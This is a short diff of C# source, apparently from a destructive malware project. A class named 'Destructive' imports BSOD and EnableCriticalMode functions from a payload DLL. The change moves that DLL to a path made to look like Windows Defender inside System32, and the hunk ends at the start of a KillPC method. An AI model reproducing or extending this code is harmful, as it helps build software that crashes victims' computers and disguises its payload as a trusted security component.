@@ -79,10 +79,9 @@ namespace Agenois.Payloads
     }
     class Destructive
     {
-        //Temp location, change if you want.
-        [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?BSOD@Payloads@1@QAEXXZ")]
+        [DllImport(@"C:\Windows\System32\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?BSOD@Payloads@1@QAEXXZ")]
         public static extern bool BSOD();
-        [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?EnableCriticalMode@Payloads@1@QAEXXZ")]
+        [DllImport(@"C:\Windows\System32\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?EnableCriticalMode@Payloads@1@QAEXXZ")]
         public static extern bool EnableCriticalMode();
 
         public static void KillPC()
